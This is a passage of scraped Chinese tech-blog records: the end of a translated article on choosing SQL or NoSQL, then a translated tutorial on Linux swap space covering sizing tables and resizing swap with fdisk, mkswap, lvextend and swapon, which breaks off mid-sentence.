,11.25 GB最大存储,\n,SQL Azure支持1024个并发打开连接，并且能够很容易地支持并发需求。另外，在考虑云计算时，11.25 GB实际上是一个非常小的数字。,\n,这个系统并不是下一个FaceBook或必应——那么NoSQL的路线真的值得吗？,\n,#4：NoSQL解决方案真的能帮你省钱吗？,\n,在纸面上，Azure表存储是一种更便宜的选择，因为它的每Gb数据仅为美分，而SQL Azure则在此期间收取大约5美元的数据。,\n,但是因为我们系统的存储空间不会超过12 GB——这真的很重要吗？每月60美元是我们在同一个系统上花30分钟写代码的钱。,\n,因此，在决定使用NoSQL仅仅是因为它的单位成本更低之前，先弄清楚节省下来的钱是否占了预算的很大一部分。,\n,#5：你需要吸引风险投资吗？,\n,有趣的是，硅谷对NoSQL有偏见。这是因为感觉上NoSQL被认为具有内在的可伸缩性，并且RDBMS被认为是不可伸缩的。记住，关键字是“感觉上”！,\n,这种可扩展性的感觉可能会让投资者相信，你的软件正处于正确的轨道上，准备好接受大规模的采用，从而吸引他们的投资资金。,\n,许多NoSQL公司本身就是风投公司，这也给他们带来了积极的偏见。,\n,最后，围绕“NoSQL”的所有营销活动都有助于推动投资者对你的产品的正面情绪。,\n,#6：你是在雇佣创业精神的人吗？,\n,如果你打算雇佣创业精神的人，他们中的很多人可能已经有NoSQL的知识了。,\n,然而，如果你不在一个主要的科技中心，那么获得这些人才的机会就很少了。您所在的区域可能有一个现成的RDBMS开发人员池——试图在这样的区域中招募NoSQL工程师和DBA可能会延迟项目交付日期，并且由于供应需求曲线，也会花费您更多的钱。,\n,我的建议是与你的招聘机构/人力资源部门合作，对开发者进行市场调查，并将其纳入你的技术选择中。,\n,#7：你的客户在下游使用什么技术？,\n,考虑这样一个场景：您向客户交付分析数据。您正在使用NoSQL来存储分析数据。然而，您的一个客户决定坚持使用基于SQL的报告系统。,\n,这对你来说意味着什么？,\n,这意味着您现在需要将所有NoSQL数据转换为SQL格式，并通过,Azure数据工厂,等服务将其向下推到客户的SQL数据库。这是您需要承担额外的开发和运营成本。如果您的所有下游客户都在使用SQL，那么您需要认真地考虑是否使用NoSQL和做所有这些昂贵的数据转换对您的系统有意义吗？,\n,#8：对于你的产品，可用性是否胜过一致性？,\n,如果你正在建立一个像Facebook newsfeed这样的系统，你可能会希望这个系统是高可用性的，并且是,最终一致,。,\n,另一方面，如果您正在构建一个银行系统（或者像我们的案例那样的模式存储），您可能希望支持强一致性，并放弃高可用性。,\n,无论采用哪种方式，您都应该首先考虑CAP定理的含义，然后决定您的系统是否需要SQL或NoSQL解决方案。,\n,#9：您是否预期对数据库模式进行大量更改？,\n,如果您期望对数据库模式进行大量更改，就像移动应用程序、实时分析、内容管理系统等经常发生的情况一样，那么NoSQL解决方案可能就是一种方法。,\n,您可以使用一个分区方案，它允许您以一种比大多数SQL数据库允许的更方便的方式更新您的数据库模式。,\n,#10：你想用NoSQL来获得个人的充实/满足吗？,\n,请不要这样做！,\n,我曾见过一些人，他们只是迷恋于学习一个NoSQL系统，并将其放入他们的简历中。这并没有什么错——我对NoSQL技术也很着迷。,\n,但是，请不要让这成为选择技术堆栈背后的驱动因素（有意识的或下意识的）。如果你愿意的话，你可以在自己的时间里学习。,\n,谁赢得了数据库战争？,\n,坦率地说 – 没有哪个玩家能赢者通吃!,\n,在很多情况下，您可能需要SQL和NoSQL技术在同一系统中并存。 例如，如果您正在构建像Instagram这样的照片共享应用程序，则您的照片可能位于NoSQL数据库中，而您的登录/ ACL信息可能位于SQL数据库中。,\n,有兴趣了解更多？ 请查看“,下一代数据库,”一书，深入了解NoSQL技术的发展和特点。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114437/", "url_object_id": "65e4499cde3fe352d46124119b072784", "front_image_path": "full/f063941289465ff36a2dca85db55733a7ae2d8e0.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/10/826020081afe2f59d84dafce6da65189.jpg"], "title": "Linux 系统上交换空间的介绍", "create_time": "2018/10/16", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,David Both,   译文出处：,Linux中国/heguangzhi,   ,学习如何修改你的系统上的交换空间的容量，以及你到底需要多大的交换空间。,\n,\n,当今无论什么操作系统交换Swap空间是非常常见的。Linux 使用交换空间来增加主机可用的虚拟内存。它可以在常规文件或逻辑卷上使用一个或多个专用交换分区或交换文件。,\n,典型计算机中有两种基本类型的内存。第一种类型，随机存取存储器 (RAM)，用于存储计算机使用的数据和程序。只有程序和数据存储在 RAM 中，计算机才能使用它们。随机存储器是易失性存储器；也就是说，如果计算机关闭了，存储在 RAM 中的数据就会丢失。,\n,硬盘是用于长期存储数据和程序的磁性介质。该磁介质可以很好的保存数据；即使计算机断电，存储在磁盘上的数据也会保留下来。CPU（中央处理器）不能直接访问硬盘上的程序和数据；它们必须首先复制到 RAM 中，RAM 是 CPU 访问代码指令和操作数据的地方。在引导过程中，计算机将特定的操作系统程序（如内核、init 或 systemd）以及硬盘上的数据复制到 RAM 中，在 RAM 中，计算机的处理器 CPU 可以直接访问这些数据。,\n,交换空间,\n,交换空间是现代 Linux 系统中的第二种内存类型。交换空间的主要功能是当全部的 RAM 被占用并且需要更多内存时，用磁盘空间代替 RAM 内存。,\n,例如，假设你有一个 8GB RAM 的计算机。如果你启动的程序没有填满 RAM，一切都好，不需要交换。假设你在处理电子表格，当添加更多的行时，你电子表格会增长，加上所有正在运行的程序，将会占用全部的 RAM 。如果这时没有可用的交换空间，你将不得不停止处理电子表格，直到关闭一些其他程序来释放一些 RAM 。,\n,内核使用一个内存管理程序来检测最近没有使用的内存块（内存页）。内存管理程序将这些相对不经常使用的内存页交换到硬盘上专门指定用于“分页”或交换的特殊分区。这会释放 RAM，为输入电子表格更多数据腾出了空间。那些换出到硬盘的内存页面被内核的内存管理代码跟踪，如果需要，可以被分页回 RAM。,\n,Linux 计算机中的内存总量是 RAM + 交换分区，交换分区被称为虚拟内存.,\n,Linux 交换分区类型,\n,Linux 提供了两种类型的交换空间。默认情况下，大多数 Linux 在安装时都会创建一个交换分区，但是也可以使用一个特殊配置的文件作为交换文件。交换分区顾名思义就是一个标准磁盘分区，由 ,mkswap, 命令指定交换空间。,\n,如果没有可用磁盘空间来创建新的交换分区，或者卷组中没有空间为交换空间创建逻辑卷，则可以使用交换文件。这只是一个创建好并预分配指定大小的常规文件。然后运行 ,mkswap, 命令将其配置为交换空间。除非绝对必要，否则我不建议使用文件来做交换空间。（LCTT 译注：Ubuntu 近来的版本采用了交换文件而非交换空间，所以我对于这种说法保留看法）,\n,频繁交换,\n,当总虚拟内存（RAM 和交换空间）变得快满时，可能会发生频繁交换。系统花了太多时间在交换空间和 RAM 之间做内存块的页面切换，以至于几乎没有时间用于实际工作。这种情况的典型症状是：系统变得缓慢或完全无反应，硬盘指示灯几乎持续亮起。,\n,使用 ,free, 的命令来显示 CPU 负载和内存使用情况，你会发现 CPU 负载非常高，可能达到系统中 CPU 内核数量的 30 到 40 倍。另一个情况是 RAM 和交换空间几乎完全被分配了。,\n,事实上，查看 SAR（系统活动报告）数据也可以显示这些内容。在我的每个系统上都安装 SAR ，并将这些用于数据分析。,\n,交换空间的正确大小是多少？,\n,许多年前，硬盘上分配给交换空间大小是计算机上的 RAM 的两倍（当然，这是大多数计算机的 RAM 以 KB 或 MB 为单位的时候）。因此，如果一台计算机有 64KB 的 RAM，应该分配 128KB 的交换分区。该规则考虑到了这样的事实情况，即 RAM 大小在当时非常小，分配超过 2 倍的 RAM 用于交换空间并不能提高性能。使用超过两倍的 RAM 进行交换，比实际执行有用的工作的时候，大多数系统将花费更多的时间。,\n,RAM 现在已经很便宜了，如今大多数计算机的 RAM 都达到了几十亿字节。我的大多数新电脑至少有 8GB 内存，一台有 32GB 内存，我的主工作站有 64GB 内存。我的旧电脑有 4 到 8GB 的内存。,\n,当操作具有大量 RAM 的计算机时，交换空间的限制性能系数远低于 2 倍。,Fedora 28 在线安装指南, 定义了当前关于交换空间分配的方法。下面内容是我提出的建议。,\n,下表根据系统中的 RAM 大小以及是否有足够的内存让系统休眠，提供了交换分区的推荐大小。建议的交换分区大小是在安装过程中自动建立的。但是，为了满足系统休眠，您需要在自定义分区阶段编辑交换空间。,\n,表 1: Fedora 28 文档中推荐的系统交换空间,\n,\n,\n,\n,系统内存大小,\n,推荐的交换空间,\n,推荐的交换空间大小（支持休眠模式）,\n,\n,\n,\n,\n,小于 2 GB,\n,2 倍 RAM,\n,3 倍 RAM,\n,\n,\n,2 GB – 8 GB,\n,等于 RAM 大小,\n,2 倍 RAM,\n,\n,\n,8 GB – 64 GB,\n,0.5 倍 RAM,\n,1.5 倍 RAM,\n,\n,\n,大于 64 GB,\n,工作量相关,\n,不建议休眠模式,\n,\n,\n,\n,在上面列出的每个范围之间的边界(例如，具有 2GB、8GB 或 64GB 的系统 RAM)，请根据所选交换空间和支持休眠功能请谨慎使用。如果你的系统资源允许，增加交换空间可能会带来更好的性能。,\n,当然，大多数 Linux 管理员对多大的交换空间量有自己的想法。下面的表2 包含了基于我在多种环境中的个人经历所做出的建议。这些可能不适合你，但是和表 1 一样，它们可能对你有所帮助。,\n,表 2: 作者推荐的系统交换空间,\n,\n,\n,\n,RAM 大小,\n,推荐的交换空间,\n,\n,\n,\n,\n,≤ 2GB,\n,2X RAM,\n,\n,\n,2GB – 8GB,\n,= RAM,\n,\n,\n,>8GB,\n,8GB,\n,\n,\n,\n,这两个表中共同点，随着 RAM 数量的增加，超过某一点增加更多交换空间只会导致在交换空间几乎被全部使用之前就发生频繁交换。根据以上建议，则应尽可能添加更多 RAM，而不是增加更多交换空间。如类似影响系统性能的情况一样，请使用最适合你的建议。根据 Linux 环境中的条件进行测试和更改是需要时间和精力的。,\n,向非 LVM 磁盘环境添加更多交换空间,\n,面对已安装 Linux 的主机并对交换空间的需求不断变化，有时有必要修改系统定义的交换空间的大小。此过程可用于需要增加交换空间大小的任何情况。它假设有足够的可用磁盘空间。此过程还假设磁盘分区为 “原始的” EXT4 和交换分区，而不是使用逻辑卷管理（LVM）。,\n,基本步骤很简单:,\n,\n,关闭现有的交换空间。,\n,创建所需大小的新交换分区。,\n,重读分区表。,\n,将分区配置为交换空间。,\n,添加新分区到 ,/etc/fstab,。,\n,打开交换空间。,\n,\n,应该不需要重新启动机器。,\n,为了安全起见，在关闭交换空间前，至少你应该确保没有应用程序在运行，也没有交换空间在使用。,free, 或 ,top, 命令可以告诉你交换空间是否在使用中。为了更安全，您可以恢复到运行级别 1 或单用户模式。,\n,使用关闭所有交换空间的命令关闭交换分区：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nswapoff -a,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,swapoff, ,-,a,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在查看硬盘上的现有分区。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfdisk -l,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,fdisk, ,-,l,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将显示每个驱动器上的分区表。按编号标识当前的交换分区。,\n,使用以下命令在交互模式下启动 ,fdisk,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfdisk /dev/<device name>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,fdisk, ,/,dev,/,<,device ,name,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfdisk /dev/sda,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,fdisk, ,/,dev,/,sda,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,此时，,fdisk, 是交互方式的，只在指定的磁盘驱动器上进行操作。,\n,使用 ,fdisk, 的 ,p, 子命令验证磁盘上是否有足够的可用空间来创建新的交换分区。硬盘上的空间以 512 字节的块以及起始和结束柱面编号的形式显示，因此您可能需要做一些计算来确定分配分区之间和末尾的可用空间。,\n,使用 ,n, 子命令创建新的交换分区。,fdisk, 会问你开始柱面。默认情况下，它选择编号最低的可用柱面。如果你想改变这一点，输入开始柱面的编号。,\n,fdisk, 命令允许你以多种格式输入分区的大小，包括最后一个柱面号或字节、KB 或 MB 的大小。例如，键入 4000M ，这将在新分区上提供大约 4GB 的空间，然后按回车键。,\n,使用 ,p, 子命令来验证分区是否按照指定的方式创建的。请注意，除非使用结束柱面编号，否则分区可能与你指定的不完全相同。,fdisk, 命令只能在整个柱面上增量的分配磁盘空间，因此你的分区可能比你指定的稍小或稍大。如果分区不是您想要的，你可以删除它并重新创建它。,\n,现在指定新分区是交换分区了 。子命令 ,t, 允许你指定定分区的类型。所以输入 ,t,，指定分区号，当它要求十六进制分区类型时，输入 ,82,，这是 Linux 交换分区类型，然后按回车键。,\n,当你对创建的分区感到满意时，使用 ,w, 子命令将新的分区表写入磁盘。,fdisk, 程序将退出，并在完成修改后的分区表的编写后返回命令提示符。当 ,fdisk, 完成写入新分区表时，会收到以下消息:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nThe partition table has been altered!\r\nCalling ioctl() to re-read partition table.\r\nWARNING: Re-reading the partition table failed with error 16: Device or resource busy.\r\nThe kernel still uses the old table.\r\nThe new table will be used at the next reboot.\r\nSyncing disks.,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,The ,partition ,table ,has ,been ,altered,!,Calling ,ioctl,(,), ,to, ,re,-,read ,partition ,table,.,WARNING,:, ,Re,-,reading ,the ,partition ,table ,failed ,with ,error, ,16,:, ,Device ,or, ,resource ,busy,.,The ,kernel ,still ,uses ,the ,old ,table,.,The ,new, ,table ,will ,be ,used ,at ,the ,next ,reboot,.,Syncing ,disks,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,此时，你使用 ,partprobe, 命令强制内核重新读取分区表，这样就不需要执行重新启动机器。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npartprobe,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,partprobe,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用命令 ,fdisk -l, 列出分区，新交换分区应该在列出的分区中。确保新的分区类型是 “Linux swap”。,\n,修改 ,/etc/fstab, 文件以指向新的交换分区。如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nLABEL=SWAP-sdaX   swap        swap    defaults        0 0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,LABEL,=,SWAP,-,sdaX, , , ,swap, , , , , , , , ,swap, , , , ,defaults, , , , , , , , ,0, ,0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其中 ,X, 是分区号。根据新交换分区的位置，添加以下内容：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/dev/sdaY         swap        swap    defaults        0 0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/,dev,/,sdaY, , , , , , , , , ,swap, , , , , , , , ,swap, , , , ,defaults, , , , , , , , ,0, ,0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,请确保使用正确的分区号。现在，可以执行创建交换分区的最后一步。使用 ,mkswap, 命令将分区定义为交换分区。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmkswap /dev/sdaY,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,mkswap, ,/,dev,/,sdaY,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,最后一步是使用以下命令启用交换空间：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nswapon -a,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,swapon, ,-,a,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你的新交换分区现在与以前存在的交换分区一起在线。您可以使用 ,free, 或,top, 命令来验证这一点。,\n,在 LVM 磁盘环境中添加交换空间,\n,如果你的磁盘使用 LVM ，更改交换空间将相当容易。同样，假设当前交换卷所在的卷组中有可用空间。默认情况下，LVM 环境中的 Fedora Linux 在安装过程将交换分区创建为逻辑卷。您可以非常简单地增加交换卷的大小。,\n,以下是在 LVM 环境中增加交换空间大小的步骤:,\n,\n,关闭所有交换空间。,\n,增加指定用于交换空间的逻辑卷的大小。,\n,为交换空间调整大小的卷配置。,\n,启用交换空间。,\n,\n,首先，让我们使用 ,lvs, 命令（列出逻辑卷）来验证交换空间是否存在以及交换空间是否是逻辑卷。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@studentvm1 ~]# lvs\r\n  LV     VG                Attr       LSize  Pool   Origin Data%  Meta%  Move Log Cpy%Sync Convert\r\n  home   fedora_studentvm1 -wi-ao----  2.00g                                                      \r\n  pool00 fedora_studentvm1 twi-aotz--  2.00g               8.17   2.93                            \r\n  root   fedora_studentvm1 Vwi-aotz--  2.00g pool00        8.17                                   \r\n  swap   fedora_studentvm1 -wi-ao----  8.00g                                                      \r\n  tmp    fedora_studentvm1 -wi-ao----  5.00g                                                      \r\n  usr    fedora_studentvm1 -wi-ao---- 15.00g                                                      \r\n  var    fedora_studentvm1 -wi-ao---- 10.00g                                                      \r\n[root@studentvm1 ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,studentvm1, ,~,],# lvs,  ,LV     ,VG                ,Attr       ,LSize  ,Pool   ,Origin ,Data,%,  ,Meta,%,  ,Move ,Log ,Cpy,%,Sync ,Convert,  ,home   ,fedora_studentvm1, ,-,wi,-,ao,--,--,  ,2.00g,                                                      ,  ,pool00 ,fedora_studentvm1 ,twi,-,aotz,--,  ,2.00g,               ,8.17,   ,2.93,                            ,  ,root   ,fedora_studentvm1 ,Vwi,-,aotz,--,  ,2.00g, ,pool00,        ,8.17,                                   ,  ,swap   ,fedora_studentvm1, ,-,wi,-,ao,--,--,  ,8.00g,                                                      ,  ,tmp    ,fedora_studentvm1, ,-,wi,-,ao,--,--,  ,5.00g,                                                      ,  ,usr    ,fedora_studentvm1, ,-,wi,-,ao,--,--, ,15.00g,                                                      ,  ,var,    ,fedora_studentvm1, ,-,wi,-,ao,--,--, ,10.00g,                                                      ,[,root,@,studentvm1, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你可以看到当前的交换空间大小为 8GB。在这种情况下，我们希望将 2GB 添加到此交换卷中。首先，停止现有的交换空间。如果交换空间正在使用，终止正在运行的程序。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nswapoff -a,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,swapoff, ,-,a,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在增加逻辑卷的大小。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@studentvm1 ~]# lvextend -L +2G /dev/mapper/fedora_studentvm1-swap\r\n  Size of logical volume fedora_studentvm1/swap changed from 8.00 GiB (2048 extents) to 10.00 GiB (2560 extents).\r\n  Logical volume fedora_studentvm1/swap successfully resized.\r\n[root@studentvm1 ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,studentvm1, ,~,],# lvextend -L +2G /dev/mapper/fedora_studentvm1-swap, , ,Size ,of ,logical ,volume ,fedora_studentvm1,/,swap ,changed ,from, ,8.00, ,GiB, ,(,2048, ,extents,), ,to, ,10.00, ,GiB, ,(,2560, ,extents,),., , ,Logical ,volume ,fedora_studentvm1,/,swap ,successfully ,resized,.,[,root,@,studentvm1, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行 ,mkswap, 命令将整个 10GB 分区变成交换空间。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@studentvm1 ~]# mkswap /dev/mapper/fedora_studentvm1-swap\r\nmkswap: /dev/mapper/fedora_studentvm1-swap: warning: wiping old swap signature.\r\nSetting up swapspace version 1, size = 10 GiB (10737414144 bytes)\r\nno label, UUID=3cc2bee0-e746-4b66-aa2d-1ea15ef1574a\r\n[root@studentvm1 ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,studentvm1, ,~,],# mkswap /dev/mapper/fedora_studentvm1-swap,mkswap,:, ,/,dev,/,mapper,/,fedora_studentvm1,-,swap,:, ,warning,:, ,wiping ,old ,swap ,signature,.,Setting ,up ,swapspace ,version, ,1,,, ,size, ,=, ,10, ,GiB, ,(,10737414144, ,bytes,),no ,label,,, ,UUID,=,3cc2bee0,-,e746,-,4b66,-,aa2d,-,1ea15ef1574a,[,root,@,studentvm1, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,重新启用交换空间。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@studentvm1 ~]# swapon -a\r\n[root@studentvm1 ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,studentvm1, ,~,],# swapon -a,[,root,@,studentvm1, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，使用 ,lsblk, 命令验证新交换空间是否存在。同样，不需要重新启动机器。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@studentvm1 ~]# lsblk\r\nNAME                                 MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\r\nsda                                    8:0    0   60G  0 disk\r\n|-sda1                                 8:1    0    1G  0 part /boot\r\n`-sda2                                 8:2    0   59G  0 part\r\n  |-fedora_studentvm1-pool00_tmeta   253:0    0    4M  0 lvm  \r\n  | `-fedora_studentvm1-pool00-tpool 253:2    0    2G  0 lvm  \r\n  |   |-fedora_studentvm1-root       253:3    0    2G  0 lvm  /\r\n  |   `-fedora_studentvm1-pool00     253:6    0    2G  0 lvm  \r\n  |-fedora_studentvm1-pool00_tdata   253:1    0    2G  0 lvm  \r\n  | `-fedora_studentvm1-pool00-tpool 253:2    0    2G  0 lvm  \r\n  |   |-fedora_studentvm1-root       253:3    0    2G  0 lvm  /\r\n  |   `-fedora_studentvm1-pool00     253:6    0    2G  0 lvm  \r\n  |-fedora_studentvm1-swap           253:4    0   10G  0 lvm  [SWAP]\r\n  |-fedora_studentvm1-usr            253:5    0   15G  0 lvm  /usr\r\n  |-fedora_studentvm1-home           253:7    0    2G  0 lvm  /home\r\n  |-fedora_studentvm1-var            253:8    0   10G  0 lvm  /var\r\n  `-fedora_studentvm1-tmp            253:9    0    5G  0 lvm  /tmp\r\nsr0                                   11:0    1 1024M  0 rom  \r\n[root@studentvm1 ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,studentvm1, ,~,],# lsblk,NAME, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,MAJ,:,MIN ,RM, , ,SIZE ,RO ,TYPE ,MOUNTPOINT,sda, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,8,:,0, , , , ,0, , , ,60G, , ,0, ,disk,|,-,sda1, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,8,:,1, , , , ,0, , , , ,1G, , ,0, ,part, ,/,boot,`,-,sda2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,8,:,2, , , , ,0, , , ,59G, , ,0, ,part, , ,|,-,fedora_studentvm1,-,pool00,_,tmeta, , , ,253,:,0, , , , ,0, , , , ,4M, , ,0, ,lvm, , , , ,|, ,`,-,fedora_studentvm1,-,pool00,-,tpool, ,253,:,2, , , , ,0, , , , ,2G, , ,0, ,lvm, , , , ,|, , , ,|,-,fedora_studentvm1,-,root, , , , , , , ,253,:,3, , , , ,0, , , , ,2G, , ,0, ,lvm, , ,/, , ,|, , , ,`,-,fedora_studentvm1,-,pool00, , , , , ,253,:,6, , , , ,0, , , , ,2G, , ,0, ,lvm, , , , ,|,-,fedora_studentvm1,-,pool00,_,tdata, , , ,253,:,1, , , , ,0, , , , ,2G, , ,0, ,lvm, , , , ,|, ,`,-,fedora_studentvm1,-,pool00,-,tpool, ,253,:,2, , , , ,0, , , , ,2G, , ,0, ,lvm, , , , ,|, , , ,|,-,fedora_studentvm1,-,root, , , , , , , ,253,:,3, , , , ,0, , , , ,2G, , ,0, ,lvm, , ,/, , ,|, , , ,`,-,fedora_studentvm1,-,pool00, , , , , ,253,:,6, , , , ,0, , , , ,2G, , ,0, ,lvm, , , , ,|,-,fedora_studentvm1,-,swap, , , , , , , , , , , ,253,:,4, , , , ,0, , , ,10G, , ,0, ,lvm, , ,[,SWAP,], , ,|,-,fedora_studentvm1,-,usr, , , , , , , , , , , , ,253,:,5, , , , ,0, , , ,15G, , ,0, ,lvm, , ,/,usr, , ,|,-,fedora_studentvm1,-,home, , , , , , , , , , , ,253,:,7, , , , ,0, , , , ,2G, , ,0, ,lvm, , ,/,home, , ,|,-,fedora_studentvm1,-,var, , , , , , , , , , , , ,253,:,8, , , , ,0, , , ,10G, , ,0, ,lvm, , ,/,var, , ,`,-,fedora_studentvm1,-,tmp, , , , , , , , , , , , ,253,:,9, , , , ,0, , , , ,5G, , ,0, ,lvm, , ,/,tmp,sr0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,11,:,0, , , , ,1, ,1024M, , ,0, ,rom, , ,[,root,@,studentvm1, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,您也可以使用 ,swapon -s, 命令或 ,top,、,free, 